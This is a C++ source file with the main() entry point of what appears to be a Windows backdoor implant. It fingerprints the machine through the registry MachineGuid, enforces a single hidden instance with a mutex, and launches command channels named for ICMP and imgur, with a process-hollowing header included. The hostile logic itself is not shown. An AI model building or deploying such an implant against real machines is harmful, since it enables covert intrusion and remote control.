//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include "../shared/coroutine.h"
#include "../config.h"
#include "../shared/debug.h"
#include "../shared/win32.h"
#include "../shared/process_hollowing.h"
#include "../shared/math.h"
#include "context.h"


void icmp_thread(context& ctx);
void imgur_thread(context& ctx);

extern uint64_t deterministic_uuid_seed;

int main()
{
    // Use unique per-machine GUID to seed generation of deterministic GUIDs to make them unique on each machine.
    deterministic_uuid_seed = vr_shared_key;
    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Cryptography", 0, KEY_QUERY_VALUE|KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
    {
        union
        {
            char machine_guid[40];
            uint64_t n[5];
        } u{};
        DWORD guid_size = sizeof(u.machine_guid);
        DWORD key_type = REG_SZ;
        if (RegQueryValueExA(hKey, "MachineGuid", nullptr, &key_type, (LPBYTE)u.machine_guid, &guid_size) == ERROR_SUCCESS)
        {
            for (uint64_t k : u.n)
                deterministic_uuid_seed ^= k;
        }
        RegCloseKey(hKey);
        hKey = nullptr;
    }

    // Single instance mutex
    HANDLE hMutex = nullptr;
    {
        stl::string vr_mutex = "Global\\" + deterministic_uuid(vr_mutant_main_instance);
        hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, vr_mutex.c_str());
        if (!hMutex)
            hMutex = CreateMutexA(nullptr, 0, vr_mutex.c_str());
        else
        {
            CloseHandle(hMutex);
            return 0;
        }
    }

    WSADATA wsa{};
    WSAStartup(0x0202, &wsa);

    context ctx{};
    coroutine_loop loop{};
    coroutine_loop::activate(loop);

    coro_start([&ctx]() { icmp_thread(ctx); });
    coro_start([&ctx]() { imgur_thread(ctx); });

    coro_run();

    WSACleanup();
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
}
